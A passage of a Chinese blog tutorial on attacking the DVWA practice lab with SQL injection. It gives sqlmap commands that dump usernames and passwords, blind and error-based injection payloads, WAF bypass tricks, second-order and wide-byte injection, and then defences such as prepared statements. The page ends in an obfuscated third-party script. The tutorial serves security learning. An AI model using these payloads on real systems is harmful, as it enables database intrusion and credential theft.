<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"security=medium; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -dbs
</code></pre> 
<p><strong>爆表名：</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"security=medium; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -D dvwa -tables
</code></pre> 
<p><strong>爆字段名：</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"security=medium; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -D dvwa -T <span class="token function">users</span> --columns
</code></pre> 
<p><strong>获取用户名、密码：</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"security=medium; PHPSESSID=shmh08p3tkd0metej9r2f87ada"</span> -D dvwa -T <span class="token function">users</span> -C user,password --dump
</code></pre> 
<p><strong>3、High级别</strong><br> 有时返回结果的页面并不是当前的页面，而是另外的一个页面，这就需要指定到哪个页面获取响应，判断真假。<br> 这里我们使用 --second-url 指定到 http://192.168.124.91/DVWA/vulnerabilities/sqli/ 获取响应，判断真假，再再改一下cookie，其余和 Medium 级别一样。</p> 
<p><img src="https://images2.imgbox.com/01/eb/DiQY0h7r_o.png" alt="在这里插入图片描述"></p> 
<p><strong>爆库名：</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/session-input.php#"</span> --second-url <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=shmh08p3tkd0metej9r2f87ada; security=high"</span> -dbs
</code></pre> 
<p><strong>爆表名：</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/session-input.php#"</span> --second-url <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=shmh08p3tkd0metej9r2f87ada; security=high"</span> -D dvwa -tables
</code></pre> 
<p><strong>爆字段名：</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/session-input.php#"</span> --second-url <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=shmh08p3tkd0metej9r2f87ada; security=high"</span> -D dvwa -T <span class="token function">users</span> --columns 
</code></pre> 
<p><strong>获取用户名、密码：</strong></p> 
<pre><code class="prism language-bash">python sqlmap.py -u <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/session-input.php#"</span> --second-url <span class="token string">"http://192.168.124.91/DVWA/vulnerabilities/sqli/"</span> --data<span class="token operator">=</span><span class="token string">"id=1&amp;Submit=Submit"</span> --cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=shmh08p3tkd0metej9r2f87ada; security=high"</span> -D dvwa -T <span class="token function">users</span> -C user,password --dump
</code></pre> 
<h3><a id="DVWA__572"></a>DVWA 盲注</h3> 
<p><strong>1、基本概念</strong></p> 
<p><strong>简介：</strong> 在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，需要使用一些特殊的方式来判断，这个过程成为盲注。</p> 
<p><strong>分类：</strong> 布尔盲注（是或不是）、时间盲注</p> 
<p><strong>常用函数：</strong></p> 
<pre><code class="prism language-bash">substr<span class="token punctuation">(</span>string str, num start, num len<span class="token punctuation">)</span>	// 从 start 位置截取 str 字符串 len 位；初始位置为1，且 len 可省略

length<span class="token punctuation">(</span>string str<span class="token punctuation">)</span>	// 返回字符串长度

ord<span class="token punctuation">(</span>string str<span class="token punctuation">)</span>	// 返回 str 最左面字符的 ASCII 码值

left<span class="token punctuation">(</span>string str, num len<span class="token punctuation">)</span>	// 从左截取 str 的前 len 位

limit <span class="token punctuation">[</span>offset，<span class="token punctuation">]</span> rows	// offset 指定从哪一行开始返回，初始行的偏移量为0；rows 指定返回具体行数

ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>	// 将某个字符转换为 ASCII 码值

if<span class="token punctuation">(</span>exp1, exp2, exp3<span class="token punctuation">)</span>	// 如果 exp1 正确，就执行 exp2 ，否则执行 exp3；搭配 sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> 使用

sleep<span class="token punctuation">(</span>time<span class="token punctuation">)</span>	// 休眠多少秒

concat<span class="token punctuation">(</span>str1, str2,<span class="token punctuation">..</span>.<span class="token punctuation">)</span>	// 将多个字符串连接成一个字符串，保持原有行数

concat_ws<span class="token punctuation">(</span>separator, str1, str2, <span class="token punctuation">..</span>.<span class="token punctuation">)</span>	// 将多个字符串连接成一个字符串，但是可以一次性指定分隔符，保持原有行数

group_concat<span class="token punctuation">(</span>str1, str2,<span class="token punctuation">..</span>.<span class="token punctuation">)</span>	// 将多个字符串连接成一个字符串，合并到一行
</code></pre> 
<p><strong>2、布尔盲注</strong><br> <strong>Poc</strong><br> 输入 1 and 1=2 页面回显正常，判断为字符型SQL注入</p> 
<p><strong>爆库名</strong><br> <strong>猜长度：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and length(database())=1#		或者		'</span> or length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1</span>' and length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">4</span><span class="token comment">#</span>

页面回显正常，得到当前数据库名长度为 <span class="token number">4</span> 
</code></pre> 
<p><img src="https://images2.imgbox.com/b3/87/9Ci6vKVJ_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/6b/b0/0bxfGWe7_o.png" alt="在这里插入图片描述"></p> 
<p><strong>猜库名：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span>d<span class="token string">'#	 或者   1'</span> and ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">100</span><span class="token comment">#</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1</span><span class="token string">' and substr(database(),4,1)='</span>a'<span class="token comment">#</span>

最终，得到数据库名称为 dvwa 
</code></pre> 
<p><strong>爆表名</strong><br> <strong>猜表个数：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and (select count(table_name) from information_schema.tables where table_schema='</span>dvwa'<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment">#</span>

页面回显正常，得到表个数为 <span class="token number">2</span> 个
</code></pre> 
<p><strong>猜表2长度：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and length((select table_name from information_schema.tables where table_schema='</span>dvwa<span class="token string">' limit 1,1))=5#
或者 1'</span> and <span class="token punctuation">(</span>select length<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'dvwa'</span> limit <span class="token number">1,1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">5</span><span class="token comment">#</span>

页面回显正常，得到表2长度为 <span class="token number">5</span>
</code></pre> 
<p><strong>猜表2表名：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema='</span>dvwa<span class="token string">' limit 1,1),1,1)='</span>u<span class="token string">'#
......
1'</span> and substr<span class="token punctuation">((</span>select table_name from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'dvwa'</span> limit <span class="token number">1,1</span><span class="token punctuation">)</span>,2,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'s'</span><span class="token comment">#</span>

最终，得到表2名为 <span class="token function">users</span>
</code></pre> 
<p><strong>爆字段名、获取用户名密码的方法和前面所述差不多，就是无数遍的二分法，不再赘述</strong></p> 
<p><strong>3、时间盲注</strong><br> <strong>爆库名</strong><br> <strong>猜长度：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span>' and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">4</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment">#</span>

页面休眠了5秒，得到数据库名长为 <span class="token number">4</span>
</code></pre> 
<p><strong>猜名字：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and if(ascii(substr(database(),1,1))=100,sleep(5),1)#
页面休眠了5秒，得到数据库名第一个字母为 d
......
1'</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,4,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">97</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment">#</span>
页面休眠了5秒，得到数据库名第一个字母为 a

最终得到数据库名为：dvwa
</code></pre> 
<p><strong>爆表名</strong><br> <strong>猜表的个数：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and if((select count(table_name) from information_schema.tables where table_schema='</span>dvwa'<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment">#</span>
页面休眠了5秒，得到该数据库中表的个数为 <span class="token number">2</span> 个
</code></pre> 
<p><strong>猜表2名字的长度：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and if(length((select table_name from information_schema.tables where table_schema='</span>dvwa' limit <span class="token number">1,1</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">5</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment">#</span>
页面休眠了5秒，得到表2名字长度为 <span class="token number">5</span>
</code></pre> 
<p><strong>猜表2名字：</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span>dvwa<span class="token string">' limit 1,1),1,1))=117,sleep(5),1)#
页面休眠了5秒，得到第一个字母为 u
......
1'</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>'dvwa' limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">115</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment">#</span>
页面休眠了5秒，得到第一个字母为 s

最终得到表2名字：users
</code></pre> 
<p><strong>爆字段名、获取用户名密码的方法和前面所述差不多，就是无数遍的二分法，不再赘述</strong></p> 
<h3><a id="DVWA__717"></a>DVWA 报错注入</h3> 
<p><strong>1、基本概念</strong></p> 
<p><strong>简介：</strong> 一般是页面没有回显，但是SQL语句执行可以输出错误信息的情况。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p> 
<p>**注意：**报错注入最好用 and ，因为我们目的是让其产生报错信息。</p> 
<p><strong>Xpath类型函数(mysql version &gt;= 5.1.5)：</strong></p> 
<pre><code class="prism language-bash">extractvalue <span class="token punctuation">(</span>XML_document, XPath_string<span class="token punctuation">)</span>
 - 第一个参数：XML_document 是目标XML文档
 - 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容，报错注入正是利用这一点

updatexml <span class="token punctuation">(</span>XML_document, XPath_string, new_value<span class="token punctuation">)</span>
 - 第一个参数：XML_document 是目标XML文档
 - 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容，报错注入正是利用这一点
 - 第三个参数：new_value 用来替换查找到的符合条件的数据
</code></pre> 
<p><strong>2、注入流程</strong></p> 
<p><strong>爆库名</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,database(),0x7e))#	 或者		1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment">#</span>

根据页面回显，得到数据库名：dvwa
</code></pre> 
<p><img src="https://images2.imgbox.com/0c/d7/yDjIF8UH_o.png" alt="在这里插入图片描述"></p> 
<p><strong>爆表名</strong></p> 
<pre><code class="prism language-bash">由于 extractvalue<span class="token punctuation">(</span><span class="token punctuation">)</span> 最大返回长度为 <span class="token number">32</span> ，所以最好用 limit N,1 一行一行的进行回显。
<span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span>dvwa<span class="token string">' limit 0,1),0x7e))#
1'</span> and extractvalue<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select table_name from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'dvwa'</span> limit <span class="token number">1,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">))</span><span class="token comment">#</span>

根据页面回显，得到表名：guestbook 和 <span class="token function">users</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/95/1d/ic4oEb87_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/b4/ec/rPWwcSj8_o.png" alt="在这里插入图片描述"></p> 
<p><strong>爆字段名</strong></p> 
<pre><code class="prism language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 3,1),0x7e))#
1'</span> and extractvalue<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select column_name from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span> limit <span class="token number">4,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">))</span><span class="token comment">#</span>

得到字段名 user 与 password
</code></pre> 
<p><img src="https://images2.imgbox.com/e3/10/4sySOfOM_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/f3/7d/JcCN0yan_o.png" alt="在这里插入图片描述"></p> 
<p><strong>获取用户名、密码</strong></p> 
<pre><code class="prism language-bash">通过 concat_ws<span class="token punctuation">(</span><span class="token punctuation">)</span> 和 limit N,1来进行逐条回显。
<span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select concat_ws('</span>,',user,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">))</span><span class="token comment">#</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/18/cf/gUq6tyMr_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="SQL_780"></a>SQL注入绕过</h3> 
<p><strong>1、变换大小写</strong></p> 
<ul><li>WAF拦截了union，那就使用Union、UnloN等方式绕过</li></ul> 
<p><strong>2、16进制编码</strong></p> 
<ul><li>WAF检测敏感字’admin’，则可以用0x61646d696e代替</li><li>WAF检测敏感字select,可以在URL中将select变成%73elEcT结合大小写变换绕过WAF</li><li>用%09、%0a、%0b、%Oc、%0d、%a0、/**/、/<em>somewords</em>/等来替换空格</li></ul> 
<p><strong>3、利用注释符</strong></p> 
<ul><li>适用于WAF只过滤一次敏感字的情况，比如WAF只过滤一次union和select，则可以用/**/绕过：?id=1/<em>union</em>/union /<em>select</em>/select 1,2,3</li></ul> 
<p><strong>4、重写</strong></p> 
<ul><li>适用于WAF只过滤一次敏感字的情况，比如WAF只过滤一次union，则可以写出类似ununionion这样的：?id=1 ununionion select 1,2,3</li></ul> 
<p><strong>5、比较操作符替换</strong></p> 
<ul><li>WAF过滤等号(=)，可以用&gt;和&lt;来判断，比如要判断某个值是不是5，则可以判断是不是大于4，且小于6</li><li>WAF将=、&gt;、&lt;全部过滤，则可以利用like来绕过，如：?id=1’ or … like 1</li><li>WAF将=、&gt;、&lt;全部过滤，也可以用strcmp()函数绕过</li></ul> 
<p><strong>6、同功能函数替换</strong></p> 
<ul><li>适用于某一函数被过滤的情况，如substring()被WAF过滤，可以用同功能的mid()，substr()等函数来替换，都是用来取字符串的某一位字符</li></ul> 
<p><strong>7、二次注入</strong><br> <strong>简介：</strong> 指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入<br> <strong>补充：</strong> mysql_escape_string()函数，该函数和mysql_real_escape_string一样可以转移特殊字符，但不同的是经过mysql_escape_string处理的参数在存入数据库时会被还原成原来的数据<br> <strong>场景：</strong> 设想在登录页面username和password都经过了mysql_real_escape_string函数的转义，无法造成SQL注入。但注册页面使用的是mysql_escape_string函数，那么我们注册一个名为admin’#的用户，密码设为123456，登录该用户后，在修改密码页面修改密码为666666，这时admin’#的密码没有被修改，反而是admin的密码被修改了。<br> <strong>原理：</strong> 后端数据库执行的命令为，UPDATE users SET PASSWORD=‘666666’ where username=‘admin’#’ and password=‘123456’，等价于，UPDATE users SET PASSWORD=‘666666’ where username=‘admin’</p> 
<p><strong>8、宽字节注入（%df’)</strong><br> <strong>前言：</strong></p> 
<ul><li>当某字符的大小为一个字节时，称其字符为窄字节</li><li>当某字符的大小为两个字节时，称其字符为宽字节</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS</li></ul> 
<p><strong>原理：</strong> MySQL数据库编码与PHP编码不同导致，如MySQL数据库使用GBK编码而PHP编码为UTF8。MySQL认为两个字符是一个汉字（前一个字符ascii码要大于128，如%df），而当我们输入%df和单引号（%df’）时，MySQL会调用转义函数如addslashes，将单引号转义（添加 \ ）后整个为 %df’ ，其中 \ 的十六进制是%5c，即 %df%5c’ ，而MySQL的GBK编码会认为%df%5c是一个汉字（運)，而此时单引号仍然存在，可以实现闭合，从而造成SQL注入。<br> <img src="https://images2.imgbox.com/29/96/4Pqpv75k_o.png" alt="在这里插入图片描述"><br> <strong>参考链接：</strong> <a href="https://blog.csdn.net/lza20001103/article/details/124286601?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167859240016782425174405%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167859240016782425174405&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124286601-null-null.142%5Ev73%5Einsert_down4,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&amp;utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">渗透测试-SQL注入之宽字节注入</a></p> 
<h3><a id="SQL_822"></a>SQL注入防护</h3> 
<p><strong>1、限制数据类型</strong></p> 
<ul><li>比如使用函数 is_numeric() 判断为数字时才执行下一步，这样限制了字符从而也就限制了注入，但针对此函数可以16进制编码绕过</li></ul> 
<p><strong>2、正则表达式匹配</strong><br> 比如这段PHP代码</p> 
<pre><code class="prism language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/and|select|insert|insert|update|[A-Za-z]|/d+:/i'</span>, <span class="token variable">$id</span><span class="token punctuation">))</span> <span class="token punctuation">{<!-- --></span> 
        die<span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token builtin class-name">echo</span> <span class="token string">'good'</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>

</code></pre> 
<p><strong>3、转义函数</strong></p> 
<ul><li>php自带的magic_quotes_gpc函数，不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义</li><li>addslashes、mysql_escape_string、mysql_real_escapse_string</li></ul> 
<p><strong>4、SQL语句预编译</strong></p> 
<ul><li>防御SQL注入的最佳方式就是使用预编译SQL语句，绑定变量</li><li>预编译相当于是将数据于代码分离的方式，把传入的参数绑定为一个变量，用？表示，攻击者无法改变SQL的结构</li></ul> 
<p>比如这段PHP代码</p> 
<pre><code class="prism language-bash">String <span class="token assign-left variable">query</span><span class="token operator">=</span><span class="token string">"select password from users where username='?' "</span><span class="token punctuation">;</span>
<span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"INSERT INTO myCity (Name,CountryCode,District) VALUES (?,?,?)"</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span><span class="token operator">=</span><span class="token variable">$mysqli</span>-<span class="token operator">&gt;</span>prepare<span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span>-<span class="token operator">&gt;</span>bind_param<span class="token punctuation">(</span><span class="token string">"sss"</span>,<span class="token variable">$val1</span>,<span class="token variable">$val2</span>,<span class="token variable">$val3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$val1</span><span class="token operator">=</span><span class="token string">"Stuttgart"</span><span class="token punctuation">;</span>
<span class="token variable">$val2</span><span class="token operator">=</span><span class="token string">"DEU"</span><span class="token punctuation">;</span>
<span class="token variable">$val3</span><span class="token operator">=</span><span class="token string">"Baden"</span><span class="token punctuation">;</span>
//execute the statement
<span class="token variable">$stmt</span>-<span class="token operator">&gt;</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>即使攻击者插入类似 admin’ or 1=1# 的字符串，预编译会将传入的 admin’ or 1=1# 当做纯字符串的形式作为username执行，避免了类似sql语句拼接、闭合等非法操作</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/8d74dc195feb79026572cf6be3d02dcf/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">机器学习和深度学习的基本数据结构</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/be34f8b72304d5f64403ddb7c817b5d1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">头歌数据结构 第1关：顺序表的实现之查找功能</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X